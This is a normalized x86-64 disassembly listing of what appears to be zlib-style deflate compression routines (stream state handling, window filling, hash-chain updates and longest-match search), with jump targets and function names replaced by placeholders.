mov rdx [ rbx + 0x10 ]
mov ecx [ rdi + 0x4c ]
call sub_10015a70
mov [ rdi + 0x4c ] eax
cmp [ rdi + 0x8 ] r12d
jne r-xdata
cmp [ rdi + 0x8 ] r12d
je r-xdata
cmp ebp 0x4
jne r-xdata
movzx eax [ rdi + 0x4c ]
mov rdx rcx
mov rcx [ rbx + 0x10 ]
mov [ rdx + rcx ] al
add [ rbx + 0x28 ] 0x1
mov edx [ rbx + 0x28 ]
mov rcx [ rbx + 0x10 ]
movzx eax [ rdi + 0x4d ]
xor r8d r8d
mov [ rdx + rcx ] al
add [ rbx + 0x28 ] 0x1
xor edx edx
xor ecx ecx
call sub_10015a70
mov [ rdi + 0x4c ] eax
mov [ rbx + 0x8 ] 0x71
jmp r-xdata
mov rax [ rbx + 0x30 ]
cmp [ rax + 0x3c ] r12d
je r-xdata
mov esi 0x1
mov ecx [ rdi + 0x4c ]
sub r8d edx
mov edx edx
add rdx [ rbx + 0x10 ]
call sub_10015a70
mov [ rdi + 0x4c ] eax
test esi esi
jne r-xdata
mov r8d [ rbx + 0x28 ]
cmp r8d edx
jbe r-xdata
movsxd rax [ rbx + 0xac ]
lea r8 [ r--data ]
mov edx ebp
add rax rax
mov rcx rbx
call [ r8 + rax * 8 ]
cmp eax 0x2
je r-xdata
cmp [ rbx + 0x9c ] r12d
jne r-xdata
mov rax [ r--data ]
mov [ rdi + 0x20 ] rax
mov eax 0xfffffffb
jmp r-xdata
test esi esi
jne r-xdata
mov r8d [ rbx + 0x28 ]
cmp r8d edx
jbe r-xdata
mov [ rbx + 0x38 ] r12d
mov [ rbx + 0x8 ] 0x5b
jmp r-xdata
mov ecx [ rdi + 0x4c ]
sub r8d edx
add rdx [ rbx + 0x10 ]
call sub_10015a70
mov [ rdi + 0x4c ] eax
mov [ rbx + 0x8 ] 0x29a
cmp eax 0x3
jne r-xdata
test ebp ebp
je r-xdata
mov r12 [ rsp + 0x30 ]
mov r13 [ rsp + 0x28 ]
mov rdi [ rsp + 0x58 ]
mov rbp [ rsp + 0x48 ]
mov rbx [ rsp + 0x40 ]
add rsp 0x38
retn
mov [ rbx + 0x8 ] 0x67
jmp r-xdata
mov ecx [ rdi + 0x4c ]
sub r8d edx
add rdx [ rbx + 0x10 ]
call sub_10015a70
mov [ rdi + 0x4c ] eax
cmp [ rdi + 0x18 ] r12d
jne r-xdata
cmp eax 0x2
je r-xdata
test eax eax
je r-xdata
cmp ebp 0x4
jne r-xdata
cmp eax 0x29a
je r-xdata
xor eax eax
jmp r-xdata
mov [ rbx + 0x40 ] 0xffffffff
cmp eax 0x1
jne r-xdata
mov ecx [ rbx + 0x2c ]
test ecx ecx
jg r-xdata
cmp ebp eax
jne r-xdata
cmp ecx 0x2
jne r-xdata
lea eax [ rbp - 0x3 ]
jmp r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
mov rcx rbx
call sub_100151e0
cmp ebp 0x3
jne r-xdata
mov rcx rbx
call sub_10015280
jmp r-xdata
movzx edx [ rdi + 0x4e ]
mov rcx rbx
call sub_10011710
movzx edx [ rdi + 0x4c ]
call sub_10011710
mov edx [ rbx + 0x28 ]
movzx eax [ rdi + 0x4c ]
mov rcx [ rbx + 0x10 ]
mov [ rdx + rcx ] al
add [ rbx + 0x28 ] 0x1
mov edx [ rbx + 0x28 ]
movzx eax [ rdi + 0x4d ]
mov rcx [ rbx + 0x10 ]
mov [ rdx + rcx ] al
add [ rbx + 0x28 ] 0x1
mov edx [ rbx + 0x28 ]
movzx eax [ rdi + 0x4e ]
mov rcx [ rbx + 0x10 ]
mov [ rdx + rcx ] al
add [ rbx + 0x28 ] 0x1
mov edx [ rbx + 0x28 ]
movzx eax [ rdi + 0x4f ]
mov rcx [ rbx + 0x10 ]
mov [ rdx + rcx ] al
add [ rbx + 0x28 ] 0x1
mov edx [ rbx + 0x28 ]
movzx eax [ rdi + 0xc ]
mov rcx [ rbx + 0x10 ]
mov [ rdx + rcx ] al
add [ rbx + 0x28 ] 0x1
mov edx [ rbx + 0x28 ]
movzx eax [ rdi + 0xd ]
mov rcx [ rbx + 0x10 ]
mov [ rdx + rcx ] al
add [ rbx + 0x28 ] 0x1
mov edx [ rbx + 0x28 ]
movzx eax [ rdi + 0xe ]
mov rcx [ rbx + 0x10 ]
mov [ rdx + rcx ] al
add [ rbx + 0x28 ] 0x1
mov edx [ rbx + 0x28 ]
movzx eax [ rdi + 0xf ]
mov rcx [ rbx + 0x10 ]
mov [ rdx + rcx ] al
add [ rbx + 0x28 ] 0x1
jmp r-xdata
mov rcx rdi
call sub_10011740
cmp [ rdi + 0x18 ] r12d
je r-xdata
mov ecx [ rbx + 0x74 ]
mov rax [ rbx + 0x68 ]
xor edx edx
add ecx 0xffffffff
mov [ rax + rcx * 2 ] r12w
mov r8d [ rbx + 0x74 ]
mov rcx [ rbx + 0x68 ]
add r8d 0xffffffff
add r8 r8
call memset
cmp [ rbx + 0x28 ] r12d
sete r12b
mov eax r12d
jmp r-xdata
neg r11d
mov [ rbx + 0x2c ] r11d
mov rcx rdi
call sub_10011740
mov r11d [ rbx + 0x2c ]
test r11d r11d
jle r-xdata
sub_100120a0
sub rsp 0x28
test rcx rcx
mov [ rsp + 0x40 ] rbx
mov rbx rcx
je r-xdata
mov eax 0xfffffffe
mov rbx [ rsp + 0x40 ]
add rsp 0x28
retn
mov rax [ rcx + 0x28 ]
test rax rax
je r-xdata
mov [ rsp + 0x48 ] rdi
mov edi [ rax + 0x8 ]
cmp edi 0x2a
je r-xdata
mov rdx [ rax + 0x10 ]
test rdx rdx
je r-xdata
cmp edi 0x45
je r-xdata
mov rax [ rbx + 0x28 ]
mov rdx [ rax + 0x68 ]
test rdx rdx
je r-xdata
mov rcx [ rcx + 0x40 ]
call [ rbx + 0x38 ]
cmp edi 0x49
je r-xdata
mov rax [ rbx + 0x28 ]
mov rdx [ rax + 0x60 ]
test rdx rdx
je r-xdata
mov rcx [ rbx + 0x40 ]
call [ rbx + 0x38 ]
cmp edi 0x5b
je r-xdata
mov rax [ rbx + 0x28 ]
mov rdx [ rax + 0x50 ]
test rdx rdx
je r-xdata
mov rcx [ rbx + 0x40 ]
call [ rbx + 0x38 ]
cmp edi 0x67
je r-xdata
mov rdx [ rbx + 0x28 ]
mov rcx [ rbx + 0x40 ]
call [ rbx + 0x38 ]
xor r11d r11d
cmp edi 0x71
mov rdi [ rsp + 0x48 ]
mov eax 0xfffffffd
mov [ rbx + 0x28 ] r11
cmove r11d eax
mov eax r11d
mov rbx [ rsp + 0x40 ]
add rsp 0x28
retn
mov rcx [ rbx + 0x40 ]
call [ rbx + 0x38 ]
cmp edi 0x71
je r-xdata
cmp edi 0x29a
je r-xdata
mov eax 0xfffffffe
mov rdi [ rsp + 0x48 ]
mov rbx [ rsp + 0x40 ]
add rsp 0x28
retn
sub_10012190
sub rsp 0x28
mov eax [ rcx + 0x8 ]
mov [ rsp + 0x38 ] rbp
mov [ rsp + 0x40 ] rsi
cmp eax r8d
mov esi eax
mov [ rsp + 0x48 ] rdi
cmova esi r8d
mov rbp rdx
mov rdi rcx
test esi esi
jne r-xdata
sub eax esi
mov [ rcx + 0x8 ] eax
mov rax [ rcx + 0x28 ]
mov ecx [ rax + 0x2c ]
cmp ecx 0x1
jne r-xdata
xor eax eax
mov rdi [ rsp + 0x48 ]
mov rsi [ rsp + 0x40 ]
mov rbp [ rsp + 0x38 ]
add rsp 0x28
retn
cmp ecx 0x2
jne r-xdata
mov rdx [ rdi ]
mov ecx [ rdi + 0x4c ]
mov r8d esi
call sub_100135f0
jmp r-xdata
mov rdx [ rdi ]
mov r8d esi
mov rcx rbp
mov [ rsp + 0x30 ] rbx
mov ebx esi
call memcpy
add [ rdi ] rbx
add [ rdi + 0xc ] esi
mov rbp [ rsp + 0x38 ]
mov rdi [ rsp + 0x48 ]
mov rbx [ rsp + 0x30 ]
mov eax esi
mov rsi [ rsp + 0x40 ]
add rsp 0x28
retn
mov rdx [ rdi ]
mov ecx [ rdi + 0x4c ]
mov r8d esi
call sub_10015a70
mov [ rdi + 0x4c ] eax
sub_10012240
push rbx
sub rsp 0x20
mov eax [ rcx + 0x44 ]
mov edx [ rcx + 0x74 ]
mov rbx rcx
add eax eax
add edx 0xffffffff
mov [ rcx + 0x58 ] eax
mov rax [ rcx + 0x68 ]
mov [ rax + rdx * 2 ] 0x0
mov r8d [ rcx + 0x74 ]
mov rcx [ rcx + 0x68 ]
add r8d 0xffffffff
xor edx edx
add r8 r8
call memset
movsxd r11 [ rbx + 0xac ]
lea rcx [ r--data ]
add r11 r11
movzx eax [ rcx + r11 * 8 + 0x2 ]
mov [ rbx + 0xa8 ] eax
movzx eax [ rcx + r11 * 8 ]
mov [ rbx + 0xb4 ] eax
movzx eax [ rcx + r11 * 8 + 0x4 ]
mov [ rbx + 0xb8 ] eax
movzx eax [ rcx + r11 * 8 + 0x6 ]
mov [ rbx + 0xa0 ] 0x2
mov [ rbx + 0xa4 ] eax
xor eax eax
mov [ rbx + 0x88 ] 0x2
mov [ rbx + 0x94 ] eax
mov [ rbx + 0x84 ] eax
mov [ rbx + 0x9c ] eax
mov [ rbx + 0x90 ] eax
mov [ rbx + 0x70 ] eax
add rsp 0x20
pop rbx
retn
sub_100122f0
sub rsp 0x28
mov [ rsp + 0x30 ] rbx
mov rbx rcx
mov [ rsp + 0x40 ] rsi
mov r9d [ rbx + 0x44 ]
mov esi [ rcx + 0xa4 ]
movsxd r10 [ rbx + 0xa0 ]
mov [ rsp + 0x48 ] rdi
mov edi [ rcx + 0x94 ]
mov rcx [ rcx + 0x50 ]
lea eax [ r9 - 0x106 ]
mov [ rsp + 0x10 ] r14
mov r14d [ rbx + 0xb8 ]
cmp edi eax
mov r11d edx
lea r8 [ rdi + rcx ]
jbe r-xdata
xor edi edi
sub edi r9d
add edi 0x106
jmp r-xdata
mov r9d [ rbx + 0x9c ]
mov [ rsp + 0x38 ] rbp
cmp r14d r9d
cmova r14d r9d
shr esi 0x2
cmp r10d [ rbx + 0xb4 ]
mov [ rsp + 0x20 ] r12
movzx r12d [ r10 + r8 - 0x1 ]
mov [ rsp + 0x18 ] r13
movzx r13d [ r10 + r8 ]
mov [ rsp + 0x8 ] r15
mov r15 [ rbx + 0x60 ]
lea rdx [ r8 + 0x102 ]
jb r-xdata
mov ecx [ rbx + 0x4c ]
and rcx rbp
movzx r11d [ r15 + rcx * 2 ]
cmp r11d edi
jbe r-xdata
cmp [ rax + rcx - 0x1 ] r12b
jne r-xdata
mov r15 [ rsp + 0x8 ]
mov r14 [ rsp + 0x10 ]
mov r13 [ rsp + 0x18 ]
mov r12 [ rsp + 0x20 ]
mov rdi [ rsp + 0x48 ]
mov rsi [ rsp + 0x40 ]
mov rbp [ rsp + 0x38 ]
mov rbx [ rsp + 0x30 ]
cmp r10d r9d
cmovbe r9d r10d
mov eax r9d
add rsp 0x28
retn
add esi 0xffffffff
mov rcx [ rbx + 0x50 ]
jne r-xdata
movzx eax [ r8 ]
cmp [ rcx ] al
jne r-xdata
mov ebp r11d
movsxd rax r10d
add rcx rbp
cmp [ rax + rcx ] r13b
jne r-xdata
movzx eax [ r8 + 0x1 ]
cmp [ rcx + 0x1 ] al
jne r-xdata
add r8 0x2
add rcx 0x2
sub r8d edx
lea eax [ r8 + 0x102 ]
lea r8 [ rdx - 0x102 ]
cdqe
cmp eax r10d
jle r-xdata
movzx eax [ rcx + 0x2 ]
add r8 0x1
cmp [ r8 ] al
jne r-xdata
cmp eax r14d
mov [ rbx + 0x98 ] r11d
mov r10d eax
jge r-xdata
movzx eax [ rcx + 0x3 ]
add r8 0x1
cmp [ r8 ] al
jne r-xdata
mov r12b [ rax + r8 - 0x1 ]
mov r13b [ rax + r8 ]
movzx eax [ rcx + 0x4 ]
add r8 0x1
cmp [ r8 ] al
jne r-xdata
movzx eax [ rcx + 0x5 ]
add r8 0x1
cmp [ r8 ] al
jne r-xdata
movzx eax [ rcx + 0x6 ]
add r8 0x1
cmp [ r8 ] al
jne r-xdata
movzx eax [ rcx + 0x7 ]
add r8 0x1
cmp [ r8 ] al
jne r-xdata
movzx eax [ rcx + 0x8 ]
add rcx 0x8
add r8 0x1
cmp [ r8 ] al
jne r-xdata
cmp r8 rdx
jb r-xdata
movzx eax [ rcx + 0x1 ]
add r8 0x1
cmp [ r8 ] al
jne r-xdata
sub_100124d0
mov r8 [ rcx + 0x50 ]
mov r9d [ rcx + 0x94 ]
mov r10d edx
add r9 r8
add r10 r8
movzx eax [ r9 ]
lea r11 [ r9 + 0x102 ]
cmp [ r10 ] al
jne r-xdata
mov eax 0x2
retn
movzx eax [ r9 + 0x1 ]
cmp [ r10 + 0x1 ] al
jne r-xdata
add r9 0x2
add r10 0x2
nop
sub r9d r11d
add r9d 0x102
cmp r9d 0x3
jl r-xdata
movzx eax [ r10 + 0x2 ]
add r9 0x1
cmp [ r9 ] al
jne r-xdata
mov eax [ rcx + 0x9c ]
mov [ rcx + 0x98 ] edx
cmp r9d eax
cmovbe eax r9d
retn
movzx eax [ r10 + 0x3 ]
add r9 0x1
cmp [ r9 ] al
jne r-xdata
movzx eax [ r10 + 0x4 ]
add r9 0x1
cmp [ r9 ] al
jne r-xdata
movzx eax [ r10 + 0x5 ]
add r9 0x1
cmp [ r9 ] al
jne r-xdata
movzx eax [ r10 + 0x6 ]
add r9 0x1
cmp [ r9 ] al
jne r-xdata
movzx eax [ r10 + 0x7 ]
add r9 0x1
cmp [ r9 ] al
jne r-xdata
movzx eax [ r10 + 0x8 ]
add r10 0x8
add r9 0x1
cmp [ r9 ] al
jne r-xdata
cmp r9 r11
jb r-xdata
movzx eax [ r10 + 0x1 ]
add r9 0x1
cmp [ r9 ] al
jne r-xdata
sub_100125c0
sub rsp 0x28
mov [ rsp + 0x30 ] rbx
mov ebx [ rcx + 0x44 ]
mov [ rsp + 0x48 ] rdi
mov [ rsp + 0x38 ] rbp
mov rdi rcx
mov [ rsp + 0x40 ] rsi
nop
mov rcx [ rdi ]
cmp [ rcx + 0x8 ] 0x0
je r-xdata
mov rcx [ rdi + 0x50 ]
mov r8 rbx
lea rdx [ rcx + rbx ]
call memcpy
mov r8d [ rdi + 0x74 ]
mov rax [ rdi + 0x68 ]
sub [ rdi + 0x98 ] ebx
sub [ rdi + 0x94 ] ebx
sub [ rdi + 0x84 ] ebx
lea rdx [ rax + r8 * 2 ]
nop
mov rdi [ rsp + 0x48 ]
mov rsi [ rsp + 0x40 ]
mov rbp [ rsp + 0x38 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x28
retn
mov edx [ rdi + 0x9c ]
mov eax [ rdi + 0x94 ]
mov r8d esi
add rdx rax
add rdx [ rdi + 0x50 ]
call sub_10012190
add [ rdi + 0x9c ] eax
mov r9d [ rdi + 0x9c ]
cmp r9d 0x3
jb r-xdata
xor eax eax
sub eax ebx
jmp r-xdata
cmp r9d 0x106
jae r-xdata
mov eax [ rdi + 0x94 ]
mov rdx [ rdi + 0x50 ]
mov ecx [ rdi + 0x80 ]
movzx r8d [ rax + rdx ]
add eax 0x1
mov [ rdi + 0x70 ] r8d
movzx eax [ rax + rdx ]
shl r8d cl
xor r8d eax
and r8d [ rdi + 0x7c ]
mov [ rdi + 0x70 ] r8d
movzx eax [ rdx - 0x2 ]
sub rdx 0x2
cmp eax ebx
jb r-xdata
mov rax [ rdi + 0x60 ]
mov edx ebx
lea rcx [ rax + rbx * 2 ]
nop
nop
nop
add r8d 0xffffffff
mov [ rdx ] ax
jne r-xdata
mov rax [ rdi ]
cmp [ rax + 0x8 ] 0x0
jne r-xdata
xor eax eax
sub eax ebx
jmp r-xdata
mov edx [ rdi + 0x94 ]
mov esi [ rdi + 0x58 ]
mov eax [ rdi + 0x44 ]
sub esi [ rdi + 0x9c ]
lea ecx [ rbx + rax - 0x106 ]
sub esi edx
cmp edx ecx
jb r-xdata
movzx eax [ rcx - 0x2 ]
sub rcx 0x2
cmp eax ebx
jb r-xdata
add esi ebx
add edx 0xffffffff
mov [ rcx ] ax
jne r-xdata
sub_10012710
sub rsp 0x28
mov eax [ rcx + 0x18 ]
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x38 ] rbp
mov [ rsp + 0x40 ] rsi
add eax 0xfffffffb
mov esi 0xffff
cmp eax esi
mov [ rsp + 0x48 ] rdi
mov ebp edx
cmovb esi eax
xor edi edi
mov rbx rcx
nop
mov ecx [ rbx + 0x84 ]
add [ rbx + 0x94 ] eax
mov eax [ rbx + 0x94 ]
lea r8d [ rcx + rsi ]
mov [ rbx + 0x9c ] edi
je r-xdata
mov rcx rbx
call sub_100125c0
mov eax [ rbx + 0x9c ]
test eax eax
je r-xdata
sub eax r8d
test ecx ecx
mov [ rbx + 0x94 ] r8d
mov [ rbx + 0x9c ] eax
js r-xdata
cmp eax r8d
jb r-xdata
test ebp ebp
je r-xdata
mov rdx rdi
mov rdx rcx
add rdx [ rbx + 0x50 ]
jmp r-xdata
mov ecx [ rbx + 0x84 ]
mov r8d [ rbx + 0x94 ]
mov eax [ rbx + 0x44 ]
sub r8d ecx
sub eax 0x106
cmp r8d eax
jb r-xdata
xor eax eax
mov eax [ rbx + 0x84 ]
test eax eax
js r-xdata
sub r8d ecx
xor r9d r9d
mov rcx rbx
call sub_10015500
mov r11d [ rbx + 0x94 ]
mov rcx [ rbx ]
mov [ rbx + 0x84 ] r11d
call sub_10011740
mov r11 [ rbx ]
cmp [ r11 + 0x18 ] edi
je r-xdata
mov eax [ rbx + 0x9c ]
cmp eax 0x1
ja r-xdata
test ecx ecx
js r-xdata
mov rdx rdi
mov rdx rax
add rdx [ rbx + 0x50 ]
jmp r-xdata
mov rdx rdi
mov rdx rcx
add rdx [ rbx + 0x50 ]
jmp r-xdata
mov eax 0x1
mov ecx 0x3
cmp ebp 0x4
cmove eax ecx
jmp r-xdata
mov eax 0x2
cmp ebp 0x4
cmove edi eax
mov eax edi
jmp r-xdata
mov r8d [ rbx + 0x94 ]
mov r9d edi
cmp ebp 0x4
sete r9b
sub r8d eax
mov rcx rbx
call sub_10015500
mov r11d [ rbx + 0x94 ]
mov rcx [ rbx ]
mov [ rbx + 0x84 ] r11d
call sub_10011740
mov r11 [ rbx ]
cmp [ r11 + 0x18 ] edi
jne r-xdata
xor r9d r9d
mov rcx rbx
call sub_10015500
mov r11d [ rbx + 0x94 ]
mov rcx [ rbx ]
mov [ rbx + 0x84 ] r11d
call sub_10011740
mov r11 [ rbx ]
cmp [ r11 + 0x18 ] edi
jne r-xdata
mov rdi [ rsp + 0x48 ]
mov rsi [ rsp + 0x40 ]
mov rbp [ rsp + 0x38 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x28
retn
sub_100128d0
sub rsp 0x28
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x38 ] rbp
mov [ rsp + 0x40 ] rsi
mov [ rsp + 0x48 ] rdi
xor esi esi
mov [ rsp + 0x20 ] r12
mov ebp edx
mov rbx rcx
lea r12 [ __dos_header ]
mov edi esi
nop
cmp eax 0x3
jb r-xdata
mov rcx rbx
call sub_100125c0
mov eax [ rbx + 0x9c ]
cmp eax 0x106
jae r-xdata
test edi edi
je r-xdata
mov rax [ rbx + 0x50 ]
mov r9d [ rbx + 0x94 ]
mov rdx [ rbx + 0x68 ]
lea ecx [ r9 + 0x2 ]
movzx r8d [ rcx + rax ]
mov eax [ rbx + 0x70 ]
mov ecx [ rbx + 0x80 ]
shl eax cl
mov rcx [ rbx + 0x60 ]
xor r8d eax
mov eax [ rbx + 0x4c ]
and r8d [ rbx + 0x7c ]
and r9 rax
mov [ rbx + 0x70 ] r8d
movzx eax [ rdx + r8 * 2 ]
mov [ rcx + r9 * 2 ] ax
mov eax [ rbx + 0x4c ]
mov ecx [ rbx + 0x94 ]
mov edx [ rbx + 0x70 ]
and rcx rax
mov rax [ rbx + 0x60 ]
movzx edi [ rax + rcx * 2 ]
mov rcx [ rbx + 0x68 ]
movzx eax [ rbx + 0x94 ]
mov [ rcx + rdx * 2 ] ax
test eax eax
je r-xdata
test ebp ebp
je r-xdata
cmp [ rbx + 0x88 ] 0x3
jb r-xdata
mov ecx [ rbx + 0x94 ]
mov eax [ rbx + 0x44 ]
sub ecx edi
sub eax 0x106
cmp ecx eax
ja r-xdata
mov eax [ rbx + 0x84 ]
test eax eax
js r-xdata
xor eax eax
mov ecx [ rbx + 0x94 ]
mov rax [ rbx + 0x50 ]
mov r10d esi
movzx edx [ rcx + rax ]
mov ecx [ rbx + 0x16f4 ]
mov rax [ rbx + 0x16f8 ]
mov [ rax + rcx * 2 ] si
mov ecx [ rbx + 0x16f4 ]
mov rax [ rbx + 0x16e8 ]
mov [ rcx + rax ] dl
add [ rbx + 0x16f4 ] 0x1
add [ rbx + rdx * 4 + 0xbc ] 0x1
mov eax [ rbx + 0x16f0 ]
sub eax 0x1
cmp [ rbx + 0x16f4 ] eax
sete r10b
add [ rbx + 0x9c ] 0xffffffff
add [ rbx + 0x94 ] 0x1
mov ecx [ rbx + 0x16f4 ]
movzx r8d [ rbx + 0x94 ]
mov rax [ rbx + 0x16f8 ]
sub r8w [ rbx + 0x98 ]
movzx edx [ rbx + 0x88 ]
mov [ rax + rcx * 2 ] r8w
mov ecx [ rbx + 0x16f4 ]
mov rax [ rbx + 0x16e8 ]
sub dl 0x3
add r8w 0xffff
mov [ rcx + rax ] dl
add [ rbx + 0x16f4 ] 0x1
movzx eax dl
movzx eax [ rax + r12 + 0x17900 ]
add [ rbx + rax * 4 + 0x4c0 ] 0x1
cmp r8w 0x100
jae r-xdata
mov eax [ rbx + 0xb0 ]
cmp eax 0x2
je r-xdata
mov rdx rsi
mov rdx rax
add rdx [ rbx + 0x50 ]
jmp r-xdata
mov eax [ rbx + 0x9c ]
cmp eax 0x106
jae r-xdata
mov eax [ rbx + 0x84 ]
test eax eax
js r-xdata
movzx eax r8w
shr rax 0x7
movzx ecx [ rax + r12 + 0x17800 ]
movzx eax r8w
movzx ecx [ rax + r12 + 0x17700 ]
jmp r-xdata
cmp eax 0x3
jne r-xdata
cmp eax 0x3
je r-xdata
mov eax 0x1
mov ecx 0x3
cmp ebp 0x4
cmove eax ecx
jmp r-xdata
mov eax 0x2
cmp ebp 0x4
cmove esi eax
mov eax esi
jmp r-xdata
mov r8d [ rbx + 0x94 ]
mov r9d esi
cmp ebp 0x4
sete r9b
sub r8d eax
mov rcx rbx
call sub_10015500
mov r11d [ rbx + 0x94 ]
mov rcx [ rbx ]
mov [ rbx + 0x84 ] r11d
call sub_10011740
mov r11 [ rbx ]
cmp [ r11 + 0x18 ] esi
jne r-xdata
mov rdx rsi
mov rdx rax
add rdx [ rbx + 0x50 ]
jmp r-xdata
add [ rbx + 0x94 ] eax
mov eax [ rbx + 0x94 ]
mov rdx [ rbx + 0x50 ]
mov ecx [ rbx + 0x80 ]
mov [ rbx + 0x88 ] esi
movzx r8d [ rax + rdx ]
mov [ rbx + 0x70 ] r8d
add eax 0x1
shl r8d cl
movzx eax [ rax + rdx ]
xor r8d eax
and r8d [ rbx + 0x7c ]
mov [ rbx + 0x70 ] r8d
jmp r-xdata
cmp [ rbx + 0x9c ] 0x3
jb r-xdata
movsxd rax ecx
mov r10d esi
add [ rbx + rax * 4 + 0x9b0 ] 0x1
mov eax [ rbx + 0x16f0 ]
sub eax 0x1
cmp [ rbx + 0x16f4 ] eax
mov eax [ rbx + 0x88 ]
sete r10b
sub [ rbx + 0x9c ] eax
cmp eax [ rbx + 0xa8 ]
ja r-xdata
cmp ecx 0x1
jne r-xdata
mov edx edi
mov rcx rbx
call sub_100122f0
mov [ rbx + 0x88 ] eax
jmp r-xdata
mov r12 [ rsp + 0x20 ]
mov rdi [ rsp + 0x48 ]
mov rsi [ rsp + 0x40 ]
mov rbp [ rsp + 0x38 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x28
retn
mov r8d [ rbx + 0x94 ]
xor r9d r9d
mov rcx rbx
sub r8d eax
call sub_10015500
mov r11d [ rbx + 0x94 ]
mov rcx [ rbx ]
mov [ rbx + 0x84 ] r11d
call sub_10011740
mov r11 [ rbx ]
cmp [ r11 + 0x18 ] esi
jne r-xdata
test r10d r10d
je r-xdata
add eax 0xffffffff
mov [ rbx + 0x88 ] eax
nop
nop
nop
mov edx edi
mov rcx rbx
call sub_100124d0
mov [ rbx + 0x88 ] eax
add [ rbx + 0x94 ] 0x1
mov rax [ rbx + 0x50 ]
mov r9d [ rbx + 0x94 ]
mov rdx [ rbx + 0x68 ]
lea ecx [ r9 + 0x2 ]
movzx r8d [ rcx + rax ]
mov eax [ rbx + 0x70 ]
mov ecx [ rbx + 0x80 ]
shl eax cl
mov rcx [ rbx + 0x60 ]
xor r8d eax
mov eax [ rbx + 0x4c ]
and r8d [ rbx + 0x7c ]
and r9 rax
mov [ rbx + 0x70 ] r8d
movzx eax [ rdx + r8 * 2 ]
mov [ rcx + r9 * 2 ] ax
mov eax [ rbx + 0x4c ]
mov ecx [ rbx + 0x94 ]
mov edx [ rbx + 0x70 ]
and rcx rax
mov rax [ rbx + 0x60 ]
movzx edi [ rax + rcx * 2 ]
mov rcx [ rbx + 0x68 ]
movzx eax [ rbx + 0x94 ]
mov [ rcx + rdx * 2 ] ax
add [ rbx + 0x88 ] 0xffffffff
jne r-xdata
add [ rbx + 0x94 ] 0x1
jmp r-xdata
sub_10012cf0
mov rax rsp
sub rsp 0x38
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
xor edi edi
mov [ rax - 0x8 ] r12
mov [ rax - 0x10 ] r13
mov [ rax - 0x18 ] r14
mov r12d edx
lea r13d [ rdi + 0x2 ]
lea ebp [ rdi + 0x1 ]
mov rbx rcx
mov esi edi
lea r14 [ __dos_header ]
nop
nop
cmp eax 0x3
jb r-xdata
mov rcx rbx
call sub_100125c0
mov eax [ rbx + 0x9c ]
cmp eax 0x106
jae r-xdata
test esi esi
mov eax [ rbx + 0x88 ]
mov [ rbx + 0x88 ] r13d
mov [ rbx + 0xa0 ] eax
mov eax [ rbx + 0x98 ]
mov [ rbx + 0x8c ] eax
je r-xdata
mov rax [ rbx + 0x50 ]
mov r9d [ rbx + 0x94 ]
mov rdx [ rbx + 0x68 ]
lea ecx [ r9 + 0x2 ]
movzx r8d [ rcx + rax ]
mov eax [ rbx + 0x70 ]
mov ecx [ rbx + 0x80 ]
shl eax cl
mov rcx [ rbx + 0x60 ]
xor r8d eax
mov eax [ rbx + 0x4c ]
and r8d [ rbx + 0x7c ]
and r9 rax
mov [ rbx + 0x70 ] r8d
movzx eax [ rdx + r8 * 2 ]
mov [ rcx + r9 * 2 ] ax
mov eax [ rbx + 0x4c ]
mov ecx [ rbx + 0x94 ]
mov edx [ rbx + 0x70 ]
and rcx rax
mov rax [ rbx + 0x60 ]
movzx esi [ rax + rcx * 2 ]
mov rcx [ rbx + 0x68 ]
movzx eax [ rbx + 0x94 ]
mov [ rcx + rdx * 2 ] ax
test eax eax
je r-xdata
test r12d r12d
je r-xdata
mov eax [ rbx + 0xa0 ]
cmp eax 0x3
jb r-xdata
mov eax [ rbx + 0xa8 ]
cmp [ rbx + 0xa0 ] eax
jae r-xdata
cmp [ rbx + 0x90 ] edi
je r-xdata
xor eax eax
cmp [ rbx + 0x90 ] edi
je r-xdata
cmp [ rbx + 0x88 ] eax
ja r-xdata
mov ecx [ rbx + 0x94 ]
mov eax [ rbx + 0x44 ]
sub ecx esi
sub eax 0x106
cmp ecx eax
ja r-xdata
mov eax [ rbx + 0x84 ]
test eax eax
js r-xdata
mov ecx [ rbx + 0x94 ]
mov rax [ rbx + 0x50 ]
add ecx 0xffffffff
movzx edx [ rcx + rax ]
mov ecx [ rbx + 0x16f4 ]
mov rax [ rbx + 0x16f8 ]
mov [ rax + rcx * 2 ] di
mov ecx [ rbx + 0x16f4 ]
mov rax [ rbx + 0x16e8 ]
mov [ rcx + rax ] dl
add [ rbx + 0x16f4 ] ebp
add [ rbx + rdx * 4 + 0xbc ] bp
mov [ rbx + 0x90 ] edi
add [ rbx + 0x94 ] ebp
add [ rbx + 0x9c ] 0xffffffff
mov [ rbx + 0x90 ] ebp
jmp r-xdata
mov ecx [ rbx + 0x94 ]
mov rax [ rbx + 0x50 ]
add ecx 0xffffffff
movzx edx [ rcx + rax ]
mov ecx [ rbx + 0x16f4 ]
mov rax [ rbx + 0x16f8 ]
mov [ rax + rcx * 2 ] di
mov ecx [ rbx + 0x16f4 ]
mov rax [ rbx + 0x16e8 ]
mov [ rcx + rax ] dl
add [ rbx + 0x16f4 ] ebp
add [ rbx + rdx * 4 + 0xbc ] bp
mov eax [ rbx + 0x16f0 ]
sub eax ebp
cmp [ rbx + 0x16f4 ] eax
jne r-xdata
mov ecx [ rbx + 0x94 ]
mov eax [ rbx + 0x9c ]
movzx edx [ rbx + 0xa0 ]
lea r10d [ rcx + rax - 0x3 ]
mov rax [ rbx + 0x16f8 ]
movzx r8d cx
sub r8w [ rbx + 0x8c ]
mov ecx [ rbx + 0x16f4 ]
sub dl 0x3
sub r8w bp
mov [ rax + rcx * 2 ] r8w
mov ecx [ rbx + 0x16f4 ]
mov rax [ rbx + 0x16e8 ]
mov [ rcx + rax ] dl
add [ rbx + 0x16f4 ] ebp
movzx eax dl
movzx eax [ rax + r14 + 0x17900 ]
add r8w 0xffff
add [ rbx + rax * 4 + 0x4c0 ] bp
cmp r8w 0x100
jae r-xdata
mov eax [ rbx + 0xb0 ]
cmp eax r13d
je r-xdata
mov rdx rdi
mov rdx rax
add rdx [ rbx + 0x50 ]
jmp r-xdata
mov eax [ rbx + 0x9c ]
cmp eax 0x106
jae r-xdata
mov rax [ rbx ]
